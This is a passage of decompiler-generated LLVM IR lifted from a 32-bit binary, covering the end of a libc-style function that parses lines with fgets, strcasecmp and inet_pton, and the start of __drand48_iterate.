  %v2_8067987105 = phi i8 [ %v2_8067987, %dec_label_pc_8067983 ], [ %v2_806798796, %dec_label_pc_8067987.preheader ]
  %v1_8067987104 = phi i8* [ %v1_8067987, %dec_label_pc_8067983 ], [ %v1_806798795, %dec_label_pc_8067987.preheader ]
  %v0_8067983103 = phi i32 [ %v1_8067986, %dec_label_pc_8067983 ], [ %v0_806798749, %dec_label_pc_8067987.preheader ]
  %v2_806798d = sext i8 %v2_8067987105 to i32
  store i32 %v2_806798d, i32* @edx, align 4
  %v0_8067990 = load i32, i32* @global_var_8075640, align 64
  store i32 %v0_8067990, i32* %eax.global-to-local, align 4
  %v2_8067995 = mul nsw i32 %v2_806798d, 2
  %v3_8067995 = add i32 %v0_8067990, %v2_8067995
  %v4_8067995 = inttoptr i32 %v3_8067995 to i8*
  %v5_8067995 = load i8, i8* %v4_8067995, align 1
  %v6_8067995 = and i8 %v5_8067995, 32
  %v7_8067995 = icmp eq i8 %v6_8067995, 0
  %v1_8067999 = icmp eq i1 %v7_8067995, false
  br i1 %v1_8067999, label %dec_label_pc_8067983, label %dec_label_pc_806799b

dec_label_pc_806799b:                             ; preds = %dec_label_pc_806798d
  %v0_806799b = load i32, i32* @edi, align 4
  %v1_806799b = add i32 %v0_806799b, -6
  %v6_806799b = sub i32 5, %v0_806799b
  %v7_806799b = and i32 %v6_806799b, %v0_806799b
  %v8_806799b = icmp slt i32 %v7_806799b, 0
  %v9_806799b = icmp eq i32 %v1_806799b, 0
  %v10_806799b = icmp slt i32 %v1_806799b, 0
  %v3_806799e = icmp eq i1 %v10_806799b, %v8_806799b
  %v4_806799e = icmp eq i1 %v9_806799b, false
  %v5_806799e = and i1 %v4_806799e, %v3_806799e
  br i1 %v5_806799e, label %dec_label_pc_80679a7.preheader, label %dec_label_pc_80679a0

dec_label_pc_80679a0:                             ; preds = %dec_label_pc_806799b
  %v1_80679a0 = load i32, i32* @ebx, align 4
  %v3_80679a0 = mul i32 %v0_806799b, 4
  %v4_80679a0 = add i32 %v1_80679a0, %v3_80679a0
  %v5_80679a0 = inttoptr i32 %v4_80679a0 to i32*
  store i32 %v0_8067983103, i32* %v5_80679a0, align 4
  %v0_80679a3 = load i32, i32* @edi, align 4
  %v1_80679a3 = add i32 %v0_80679a3, 1
  store i32 %v1_80679a3, i32* @edi, align 4
  %v0_80679a7.pre.pre = load i32, i32* @ecx, align 4
  %v4_80679a7.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80679a7.preheader

dec_label_pc_80679a7.preheader:                   ; preds = %dec_label_pc_80679a0, %dec_label_pc_806799b
  %v4_80679a7.pre = phi i32 [ %v4_80679a7.pre.pre, %dec_label_pc_80679a0 ], [ %v0_8067990, %dec_label_pc_806799b ]
  %v0_80679a7.pre = phi i32 [ %v0_80679a7.pre.pre, %dec_label_pc_80679a0 ], [ %v0_8067983103, %dec_label_pc_806799b ]
  %v0_80679c054 = phi i32 [ %v1_80679a3, %dec_label_pc_80679a0 ], [ %v0_806799b, %dec_label_pc_806799b ]
  %v1_80679a7106 = inttoptr i32 %v0_80679a7.pre to i8*
  %v2_80679a7107 = load i8, i8* %v1_80679a7106, align 1
  %v3_80679a7108 = zext i8 %v2_80679a7107 to i32
  %v5_80679a7109 = and i32 %v4_80679a7.pre, -256
  %v6_80679a7110 = or i32 %v3_80679a7108, %v5_80679a7109
  store i32 %v6_80679a7110, i32* @eax, align 4
  %v4_80679a9111 = icmp eq i8 %v2_80679a7107, 0
  br i1 %v4_80679a9111, label %dec_label_pc_80679bb.loopexit, label %dec_label_pc_80679ad.lr.ph

dec_label_pc_80679ad.lr.ph:                       ; preds = %dec_label_pc_80679a7.preheader
  %v0_80679b0.pre = load i32, i32* @global_var_8075640, align 64
  br label %dec_label_pc_80679ad

dec_label_pc_80679a6:                             ; preds = %dec_label_pc_80679ad
  %v1_80679a6 = add i32 %v0_80679bb113, 1
  store i32 %v1_80679a6, i32* @ecx, align 4
  %v1_80679a7 = inttoptr i32 %v1_80679a6 to i8*
  %v2_80679a7 = load i8, i8* %v1_80679a7, align 1
  %v3_80679a7 = zext i8 %v2_80679a7 to i32
  %v5_80679a7 = and i32 %v0_80679b0.pre, -256
  %v6_80679a7 = or i32 %v3_80679a7, %v5_80679a7
  store i32 %v6_80679a7, i32* @eax, align 4
  %v4_80679a9 = icmp eq i8 %v2_80679a7, 0
  br i1 %v4_80679a9, label %dec_label_pc_80679bb.loopexit, label %dec_label_pc_80679ad

dec_label_pc_80679ad:                             ; preds = %dec_label_pc_80679ad.lr.ph, %dec_label_pc_80679a6
  %v2_80679a7115 = phi i8 [ %v2_80679a7107, %dec_label_pc_80679ad.lr.ph ], [ %v2_80679a7, %dec_label_pc_80679a6 ]
  %v1_80679a7114 = phi i8* [ %v1_80679a7106, %dec_label_pc_80679ad.lr.ph ], [ %v1_80679a7, %dec_label_pc_80679a6 ]
  %v0_80679bb113 = phi i32 [ %v0_80679a7.pre, %dec_label_pc_80679ad.lr.ph ], [ %v1_80679a6, %dec_label_pc_80679a6 ]
  %v2_80679ad = sext i8 %v2_80679a7115 to i32
  store i32 %v2_80679ad, i32* @edx, align 4
  store i32 %v0_80679b0.pre, i32* @eax, align 4
  %v2_80679b5 = mul nsw i32 %v2_80679ad, 2
  %v3_80679b5 = add i32 %v0_80679b0.pre, %v2_80679b5
  %v4_80679b5 = inttoptr i32 %v3_80679b5 to i8*
  %v5_80679b5 = load i8, i8* %v4_80679b5, align 1
  %v6_80679b5 = and i8 %v5_80679b5, 32
  %v7_80679b5 = icmp eq i8 %v6_80679b5, 0
  br i1 %v7_80679b5, label %dec_label_pc_80679a6, label %dec_label_pc_80679bb.loopexit

dec_label_pc_80679bb.loopexit:                    ; preds = %dec_label_pc_80679ad, %dec_label_pc_80679a6, %dec_label_pc_80679a7.preheader
  %v4_806798798139 = phi i32 [ %v6_80679a7110, %dec_label_pc_80679a7.preheader ], [ %v6_80679a7, %dec_label_pc_80679a6 ], [ %v0_80679b0.pre, %dec_label_pc_80679ad ]
  %v0_80679bb.lcssa = phi i32 [ %v0_80679a7.pre, %dec_label_pc_80679a7.preheader ], [ %v1_80679a6, %dec_label_pc_80679a6 ], [ %v0_80679bb113, %dec_label_pc_80679ad ]
  %v1_80679a7.lcssa = phi i8* [ %v1_80679a7106, %dec_label_pc_80679a7.preheader ], [ %v1_80679a7, %dec_label_pc_80679a6 ], [ %v1_80679a7114, %dec_label_pc_80679ad ]
  %v2_80679bb = load i8, i8* %v1_80679a7.lcssa, align 1
  %v3_80679bb = icmp eq i8 %v2_80679bb, 0
  %v1_80679be = icmp eq i1 %v3_80679bb, false
  br i1 %v1_80679be, label %dec_label_pc_8067987.preheader, label %dec_label_pc_80679c0

dec_label_pc_8067987.preheader:                   ; preds = %dec_label_pc_8067987.preheader.preheader, %dec_label_pc_80679bb.loopexit
  %v0_80679c0.pre142 = phi i32 [ %v0_80679c054, %dec_label_pc_80679bb.loopexit ], [ 0, %dec_label_pc_8067987.preheader.preheader ]
  %v4_806798798 = phi i32 [ %v4_806798798139, %dec_label_pc_80679bb.loopexit ], [ %v4_806798798.pre, %dec_label_pc_8067987.preheader.preheader ]
  %v0_806798749 = phi i32 [ %v0_80679bb.lcssa, %dec_label_pc_80679bb.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8067987.preheader.preheader ]
  %v1_806798795 = inttoptr i32 %v0_806798749 to i8*
  %v2_806798796 = load i8, i8* %v1_806798795, align 1
  %v3_806798797 = zext i8 %v2_806798796 to i32
  %v5_806798799 = and i32 %v4_806798798, -256
  %v6_8067987100 = or i32 %v5_806798799, %v3_806798797
  store i32 %v6_8067987100, i32* @eax, align 4
  %v4_8067989101 = icmp eq i8 %v2_806798796, 0
  br i1 %v4_8067989101, label %dec_label_pc_80679c0, label %dec_label_pc_806798d

dec_label_pc_8067987.dec_label_pc_80679c0.loopexit_crit_edge: ; preds = %dec_label_pc_8067983
  %v0_80679c0.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80679c0

dec_label_pc_80679c0:                             ; preds = %dec_label_pc_80679bb.loopexit, %dec_label_pc_8067987.dec_label_pc_80679c0.loopexit_crit_edge, %dec_label_pc_8067987.preheader, %dec_label_pc_806797b
  %v1_80679c3 = phi i32 [ 0, %dec_label_pc_806797b ], [ %v0_80679c0.pre.pre, %dec_label_pc_8067987.dec_label_pc_80679c0.loopexit_crit_edge ], [ %v0_80679c0.pre142, %dec_label_pc_8067987.preheader ], [ %v0_80679c054, %dec_label_pc_80679bb.loopexit ]
  %v0_80679c3 = load i32, i32* @ebx, align 4
  %v2_80679c3 = mul i32 %v1_80679c3, 4
  %v3_80679c3 = add i32 %v0_80679c3, %v2_80679c3
  %v4_80679c3 = inttoptr i32 %v3_80679c3 to i32*
  store i32 0, i32* %v4_80679c3, align 4
  %v7_80679ca = icmp sgt i32 %v1_80679c3, 1
  br i1 %v7_80679ca, label %dec_label_pc_80679d0, label %dec_label_pc_8067a63

dec_label_pc_80679d0:                             ; preds = %dec_label_pc_80679c0
  br i1 %v12_8067802, label %dec_label_pc_8067a9d, label %dec_label_pc_80679db

dec_label_pc_80679db:                             ; preds = %dec_label_pc_80679d0
  store i32 1, i32* @esi, align 4
  br i1 %v1_80679e5, label %dec_label_pc_8067a13.preheader, label %dec_label_pc_80679e7

dec_label_pc_8067a13.preheader:                   ; preds = %dec_label_pc_80679db
  %v1_8067a13119 = load i32, i32* @edi, align 4
  %v5_8067a15128 = icmp sgt i32 %v1_8067a13119, 1
  br i1 %v5_8067a15128, label %dec_label_pc_80679fd.lr.ph, label %dec_label_pc_8067a63

dec_label_pc_80679fd.lr.ph:                       ; preds = %dec_label_pc_8067a13.preheader
  br label %dec_label_pc_80679fd

dec_label_pc_80679e7:                             ; preds = %dec_label_pc_80679db
  %v0_80679e7 = load i32, i32* @eax, align 4
  %v0_80679e9 = load i32, i32* @ebx, align 4
  %v1_80679e9 = inttoptr i32 %v0_80679e9 to i32*
  %v2_80679e9 = load i32, i32* %v1_80679e9, align 4
  %v4_80679ef = call i32 @__GI_strcoll(i8* %v2_8067a06, i32 %v2_80679e9, i32 %v0_80679e7)
  store i32 %v4_80679ef, i32* %eax.global-to-local, align 4
  %v1_80679f7 = icmp eq i32 %v4_80679ef, 0
  %v1_80679f9 = icmp eq i1 %v1_80679f7, false
  br i1 %v1_80679f9, label %dec_label_pc_8067a63, label %dec_label_pc_8067a19

dec_label_pc_80679fd:                             ; preds = %dec_label_pc_80679fd.lr.ph, %dec_label_pc_8067a12
  %v1_80679ff129 = phi i32 [ 1, %dec_label_pc_80679fd.lr.ph ], [ %v1_8067a12, %dec_label_pc_8067a12 ]
  %v0_80679ff = load i32, i32* @ebx, align 4
  %v2_80679ff = mul i32 %v1_80679ff129, 4
  %v3_80679ff = add i32 %v0_80679ff, %v2_80679ff
  %v4_80679ff = inttoptr i32 %v3_80679ff to i32*
  %v5_80679ff = load i32, i32* %v4_80679ff, align 4
  %v3_8067a06 = call i32 @__GI_strcasecmp(i8* %v2_8067a06, i32 %v5_80679ff)
  store i32 %v3_8067a06, i32* %eax.global-to-local, align 4
  %v1_8067a0e = icmp eq i32 %v3_8067a06, 0
  br i1 %v1_8067a0e, label %dec_label_pc_8067a19, label %dec_label_pc_8067a12

dec_label_pc_8067a12:                             ; preds = %dec_label_pc_80679fd
  %v0_8067a12 = load i32, i32* @esi, align 4
  %v1_8067a12 = add i32 %v0_8067a12, 1
  store i32 %v1_8067a12, i32* @esi, align 4
  %v1_8067a13 = load i32, i32* @edi, align 4
  %v5_8067a15 = icmp slt i32 %v1_8067a12, %v1_8067a13
  br i1 %v5_8067a15, label %dec_label_pc_80679fd, label %dec_label_pc_8067a63

dec_label_pc_8067a19:                             ; preds = %dec_label_pc_80679e7, %dec_label_pc_80679fd
  br i1 %v1_8067a1e, label %dec_label_pc_8067a3b, label %dec_label_pc_8067a20

dec_label_pc_8067a20:                             ; preds = %dec_label_pc_8067a19
  %v3_8067a21 = load i8*, i8** %stack_var_-44, align 4
  %v4_8067a21 = ptrtoint i8* %v3_8067a21 to i32
  %v0_8067a25 = load i32, i32* @ebx, align 4
  %v1_8067a25 = inttoptr i32 %v0_8067a25 to i32*
  %v2_8067a25 = load i32, i32* %v1_8067a25, align 4
  %v3_8067a29 = inttoptr i32 %v2_8067a25 to i8*
  %v4_8067a29 = call i32 @inet_pton(i32 2, i8* %v3_8067a29, i32 %v4_8067a21)
  store i32 %v4_8067a29, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v4_8067a29, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_80678b9, label %dec_label_pc_8067a63.outer

dec_label_pc_8067a3b:                             ; preds = %dec_label_pc_8067a19
  br i1 %v1_8067a40, label %dec_label_pc_8067a63.outer, label %dec_label_pc_8067a42

dec_label_pc_8067a42:                             ; preds = %dec_label_pc_8067a3b
  %v0_8067a47 = load i32, i32* @ebx, align 4
  %v1_8067a47 = inttoptr i32 %v0_8067a47 to i32*
  %v2_8067a47 = load i32, i32* %v1_8067a47, align 4
  %v3_8067a4b = inttoptr i32 %v2_8067a47 to i8*
  %v4_8067a4b = call i32 @inet_pton(i32 10, i8* %v3_8067a4b, i32 %stack_var_-36.0)
  store i32 %v4_8067a4b, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v4_8067a4b, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_80678e6, label %dec_label_pc_8067a63.outer

dec_label_pc_8067a63:                             ; preds = %dec_label_pc_8067a13.preheader, %dec_label_pc_8067a12, %dec_label_pc_80679c0, %dec_label_pc_80679e7, %dec_label_pc_8067a63.outer
  %v0_8067a63 = load i32, i32* @edx, align 4
  %v3_8067a6d = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8067a63)
  store i32 %v3_8067a6d, i32* %eax.global-to-local, align 4
  %v1_8067a75 = icmp eq i32 %v3_8067a6d, 0
  %v1_8067a77 = icmp eq i1 %v1_8067a75, false
  br i1 %v1_8067a77, label %dec_label_pc_8067964, label %dec_label_pc_8067a7d

dec_label_pc_8067a7d:                             ; preds = %dec_label_pc_8067a63, %dec_label_pc_8067912
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8067912 ], [ %stack_var_-28.0.ph, %dec_label_pc_8067a63 ]
  br i1 %v12_8067802, label %dec_label_pc_8067a9d, label %dec_label_pc_8067a84

dec_label_pc_8067a84:                             ; preds = %dec_label_pc_8067a7d
  %v1_8067a8b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8067a8b = call i32 @__GI_fclose(i16* %v1_8067a8b)
  store i32 %v2_8067a8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067a9d

dec_label_pc_8067a9d:                             ; preds = %dec_label_pc_80679d0, %dec_label_pc_80677ed, %dec_label_pc_80677f9, %dec_label_pc_8067817, %dec_label_pc_806782a, %dec_label_pc_8067836, %dec_label_pc_806783f, %dec_label_pc_8067869, %dec_label_pc_8067a7d, %dec_label_pc_8067a84, %dec_label_pc_806789f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8067a7d ], [ %stack_var_-28.1, %dec_label_pc_8067a84 ], [ %v2_80678ae, %dec_label_pc_806789f ], [ 34, %dec_label_pc_8067869 ], [ 34, %dec_label_pc_806783f ], [ 34, %dec_label_pc_8067836 ], [ 34, %dec_label_pc_806782a ], [ 34, %dec_label_pc_8067817 ], [ 34, %dec_label_pc_80677f9 ], [ 34, %dec_label_pc_80677ed ], [ %stack_var_-28.0.ph, %dec_label_pc_80679d0 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80677d8, i32* @ebx, align 4
  store i32 %v0_80677d7, i32* @esi, align 4
  store i32 %v0_80677d6, i32* @edi, align 4
  store i32 %v0_80677d5, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8067a12, { 0, 2, 1 }
  uselistorder i32 %v1_80679c3, { 1, 0 }
  uselistorder i8 %v2_806798796, { 1, 2, 0 }
  uselistorder i8* %v1_806798795, { 1, 0 }
  uselistorder i32 %v0_806798749, { 1, 0 }
  uselistorder i32 %v2_80679ad, { 1, 0 }
  uselistorder i32 %v1_80679a6, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80679b0.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_806799b, { 1, 0 }
  uselistorder i32 %v0_806799b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_806798d, { 1, 0 }
  uselistorder i8* %v2_8067a06, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_806784b, { 2, 1, 0, 3 }
  uselistorder i32 %v0_806782a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8067807, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_806780e, { 1, 0 }
  uselistorder i32 %v1_80677e8, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 15, 4, 9, 10, 11, 12, 14, 13, 5, 2, 3, 6, 7, 8, 16, 19, 17, 18, 20, 21, 22, 23, 24 }
  uselistorder i32 34, { 6, 7, 8, 9, 10, 11, 12, 20, 21, 22, 23, 0, 18, 19, 27, 28, 16, 4, 5, 24, 25, 29, 30, 2, 1, 3, 31, 26, 13, 14, 15, 17 }
  uselistorder i32 (i16*)* @__GI_fclose, { 6, 7, 0, 2, 3, 1, 4, 5, 8 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 3, 2, 20, 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 4, 9, 8, 7, 6, 5, 1 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 (i8*, i32, i32)* @__GI_strcoll, { 5, 6, 7, 8, 0, 1, 2, 3, 4 }
  uselistorder i32 -6, { 2, 1, 4, 0, 3 }
  uselistorder i8 32, { 29, 30, 31, 32, 33, 0, 1, 19, 18, 37, 2, 16, 38, 26, 27, 28, 17, 25, 34, 39, 40, 35, 36, 3, 4, 5, 6, 7, 8, 11, 10, 9, 12, 13, 14, 20, 21, 22, 23, 24, 15 }
  uselistorder i32* @global_var_8075640, { 0, 4, 2, 5, 1, 6, 3 }
  uselistorder i32 -256, { 1, 119, 0, 120, 12, 38, 39, 40, 3, 84, 83, 2, 27, 28, 29, 30, 121, 122, 6, 123, 4, 124, 5, 125, 31, 32, 33, 34, 35, 36, 37, 8, 86, 85, 7, 137, 138, 126, 139, 140, 141, 142, 143, 144, 13, 145, 146, 147, 157, 14, 114, 15, 160, 41, 131, 42, 128, 130, 26, 9, 170, 64, 63, 10, 48, 132, 129, 127, 148, 149, 150, 151, 152, 153, 154, 11, 155, 156, 133, 52, 158, 159, 43, 161, 44, 45, 46, 164, 165, 166, 168, 169, 167, 163, 162, 18, 47, 49, 50, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 19, 20, 21, 22, 23, 24, 25, 16, 17, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 115, 116, 117, 118, 134, 135, 136 }
  uselistorder i32 35, { 4, 9, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @__errno_location, { 6, 48, 46, 59, 41, 40, 33, 32, 31, 30, 56, 136, 135, 134, 133, 132, 131, 130, 142, 141, 140, 139, 44, 129, 39, 38, 27, 26, 25, 69, 83, 128, 34, 29, 24, 23, 68, 67, 66, 65, 127, 126, 125, 17, 28, 18, 63, 106, 11, 77, 124, 54, 123, 122, 121, 55, 71, 138, 37, 36, 35, 2, 53, 52, 62, 61, 60, 16, 64, 50, 10, 9, 8, 89, 76, 51, 15, 91, 112, 111, 113, 90, 58, 120, 119, 57, 75, 118, 3, 14, 19, 117, 84, 115, 42, 7, 4, 45, 74, 82, 47, 5, 116, 49, 43, 22, 1, 0, 114, 13, 12, 110, 109, 73, 72, 108, 107, 21, 20, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 144, 93, 137, 92, 88, 87, 86, 85, 143, 81, 80, 79, 78, 70 }
  uselistorder i32 80, { 0, 8, 9, 6, 10, 11, 12, 13, 14, 15, 1, 2, 5, 7, 3, 4 }
  uselistorder i32 56, { 10, 22, 24, 7, 12, 1, 13, 14, 15, 16, 4, 23, 5, 3, 17, 18, 11, 9, 2, 25, 26, 19, 20, 21, 8, 27, 28, 6, 0 }
  uselistorder i32 44, { 21, 22, 23, 27, 28, 29, 24, 16, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 5, 33, 35, 34, 30, 31, 32, 1, 25, 17, 0, 26, 20, 18, 19, 36, 37, 2, 3, 4 }
  uselistorder i32 36, { 23, 24, 25, 27, 28, 29, 30, 31, 32, 4, 33, 5, 6, 34, 20, 21, 18, 36, 14, 15, 26, 13, 1, 12, 37, 38, 39, 40, 19, 22, 8, 16, 7, 17, 9, 0, 11, 2, 3, 10, 35 }
  uselistorder i32 -44, { 2, 1, 0 }
  uselistorder i32 48, { 18, 19, 20, 14, 15, 16, 0, 7, 4, 1, 10, 5, 6, 22, 23, 24, 25, 3, 2, 21, 26, 27, 17, 11, 12, 13, 8, 9 }
  uselistorder i32 -48, { 1, 3, 2, 4, 0 }
  uselistorder i32 -36, { 2, 0, 1 }
  uselistorder i32 -32, { 15, 13, 0, 3, 10, 1, 11, 5, 4, 6, 7, 14, 9, 12, 8, 2 }
  uselistorder i32 32, { 143, 0, 144, 145, 157, 62, 155, 82, 169, 170, 146, 60, 147, 148, 149, 83, 84, 5, 6, 117, 118, 119, 121, 8, 7, 10, 9, 70, 120, 11, 122, 123, 124, 125, 126, 127, 128, 129, 101, 102, 103, 104, 105, 106, 4, 12, 107, 108, 109, 156, 91, 92, 158, 177, 63, 90, 140, 141, 171, 14, 13, 15, 16, 85, 17, 18, 174, 19, 20, 21, 22, 23, 1, 2, 57, 64, 65, 110, 67, 111, 112, 113, 150, 151, 152, 159, 160, 3, 161, 162, 163, 164, 165, 166, 167, 24, 168, 86, 172, 173, 153, 25, 26, 27, 28, 29, 30, 31, 154, 130, 131, 132, 133, 114, 139, 175, 176, 136, 134, 135, 115, 116, 93, 61, 94, 95, 96, 97, 98, 32, 33, 35, 34, 71, 37, 36, 72, 99, 58, 59, 100, 38, 39, 137, 40, 41, 73, 42, 43, 45, 44, 74, 47, 46, 75, 49, 48, 77, 51, 50, 76, 138, 53, 52, 78, 79, 68, 54, 87, 88, 80, 66, 69, 142, 81, 56, 55, 89 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8067a9d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8067a63, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8067a19, { 1, 0 }
  uselistorder label %dec_label_pc_80679fd, { 1, 0 }
  uselistorder label %dec_label_pc_80679c0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8067987.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80679ad, { 1, 0 }
  uselistorder label %dec_label_pc_806797b, { 1, 0 }
  uselistorder label %dec_label_pc_8067a63.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_806794d, { 1, 0 }
  uselistorder label %dec_label_pc_8067912, { 1, 0 }
  uselistorder label %dec_label_pc_8067869, { 1, 0 }
  uselistorder label %dec_label_pc_80677f9, { 1, 0 }
}

define i32 @__drand48_iterate(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_8067ab7 = add i32 %arg2, 14
  %v2_8067ab7 = inttoptr i32 %v1_8067ab7 to i16*
  %v3_8067ab7 = load i16, i16* %v2_8067ab7, align 2
  %v4_8067ab7 = icmp eq i16 %v3_8067ab7, 0
  %v1_8067abc = icmp eq i1 %v4_8067ab7, false
  br i1 %v1_8067abc, label %dec_label_pc_8067ad8, label %dec_label_pc_8067abe

dec_label_pc_8067abe:                             ; preds = %entry
  %v1_8067abe = add i32 %arg2, 16
  %v2_8067abe = inttoptr i32 %v1_8067abe to i32*
  store i32 -554899859, i32* %v2_8067abe, align 4
  %v0_8067ac5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067ac5 = add i32 %v0_8067ac5, 20
  %v2_8067ac5 = inttoptr i32 %v1_8067ac5 to i32*
  store i32 5, i32* %v2_8067ac5, align 4
  %v0_8067acc = load i32, i32* %esi.global-to-local, align 4
  %v1_8067acc = add i32 %v0_8067acc, 12
  %v2_8067acc = inttoptr i32 %v1_8067acc to i16*
  store i16 11, i16* %v2_8067acc, align 2
  %v0_8067ad2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067ad2 = add i32 %v0_8067ad2, 14
  %v2_8067ad2 = inttoptr i32 %v1_8067ad2 to i16*
  store i16 1, i16* %v2_8067ad2, align 2
  %v0_8067af9.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8067ad8

dec_label_pc_8067ad8:                             ; preds = %entry, %dec_label_pc_8067abe
  %v0_8067b19 = phi i32 [ %arg2, %entry ], [ %v0_8067af9.pre, %dec_label_pc_8067abe ]
  %v4_8067ad8 = ptrtoint i16* %arg1 to i32
  %v1_8067ade = add i32 %v4_8067ad8, 2
  %v2_8067ade = inttoptr i32 %v1_8067ade to i16*
  %v3_8067ade = load i16, i16* %v2_8067ade, align 2
  %v4_8067ade = zext i16 %v3_8067ade to i32
  store i32 %v4_8067ad8, i32* %ecx.global-to-local, align 4
  %v2_8067aec = mul nuw i32 %v4_8067ade, 65536
  store i32 %v2_8067aec, i32* %eax.global-to-local, align 4
  %v1_8067af2 = add i32 %v4_8067ad8, 4
  %v2_8067af2 = inttoptr i32 %v1_8067af2 to i16*
  %v3_8067af2 = load i16, i16* %v2_8067af2, align 2
  %v4_8067af2 = zext i16 %v3_8067af2 to i32
  store i32 %v4_8067af2, i32* %eax.global-to-local, align 4
  %v2_8067af6 = load i16, i16* %arg1, align 2
  %v3_8067af6 = zext i16 %v2_8067af6 to i32
  store i32 %v3_8067af6, i32* %ecx.global-to-local, align 4
  %v1_8067af9 = add i32 %v0_8067b19, 16
  %v2_8067af9 = inttoptr i32 %v1_8067af9 to i32*
  %v3_8067af9 = load i32, i32* %v2_8067af9, align 4
  store i32 %v3_8067af6, i32* %eax.global-to-local, align 4
  store i32 %v2_8067aec, i32* %ecx.global-to-local, align 4
  %v4_8067b0a = mul i32 %v3_8067af9, %v4_8067af2
  %v1_8067b0d = add i32 %v0_8067b19, 20
  %v2_8067b0d = inttoptr i32 %v1_8067b0d to i32*
  %v3_8067b0d = load i32, i32* %v2_8067b0d, align 4
  %v2_8067b10 = or i32 %v3_8067af6, %v2_8067aec
  store i32 %v2_8067b10, i32* %ecx.global-to-local, align 4
  %v4_8067b12 = mul i32 %v3_8067b0d, %v2_8067b10
  store i32 %v2_8067b10, i32* %eax.global-to-local, align 4
  %v2_8067b17 = add i32 %v4_8067b12, %v4_8067b0a
  %v3_8067b19 = load i32, i32* %v2_8067af9, align 4
  %v5_8067b19 = zext i32 %v3_8067b19 to i64
  %v6_8067b19 = zext i32 %v2_8067b10 to i64
  %v7_8067b19 = mul nuw i64 %v5_8067b19, %v6_8067b19
  %v8_8067b19 = trunc i64 %v7_8067b19 to i32
  %v9_8067b19 = udiv i64 %v7_8067b19, 4294967296
  %v10_8067b19 = trunc i64 %v9_8067b19 to i32
  store i32 %v8_8067b19, i32* %eax.global-to-local, align 4
  store i32 %v8_8067b19, i32* %ecx.global-to-local, align 4
  %v1_8067b1e = add i32 %v0_8067b19, 12
  %v2_8067b1e = inttoptr i32 %v1_8067b1e to i16*
  %v3_8067b1e = load i16, i16* %v2_8067b1e, align 2
  %v4_8067b1e = zext i16 %v3_8067b1e to i32
  %v2_8067b22 = add i32 %v10_8067b19, %v2_8067b17
  %v2_8067b27 = add i32 %v4_8067b1e, %v8_8067b19
  %v7_8067b27 = icmp ult i32 %v2_8067b27, %v4_8067b1e
  store i32 %v2_8067b27, i32* %eax.global-to-local, align 4
  store i32 %v4_8067ad8, i32* %ecx.global-to-local, align 4
  %v3_8067b2d = zext i1 %v7_8067b27 to i32
  %v5_8067b2d = add i32 %v2_8067b22, %v3_8067b2d
  %v1_8067b2f = trunc i32 %v2_8067b27 to i16
  store i16 %v1_8067b2f, i16* %arg1, align 2
  %v3_8067b32 = udiv i32 %v2_8067b27, 65536
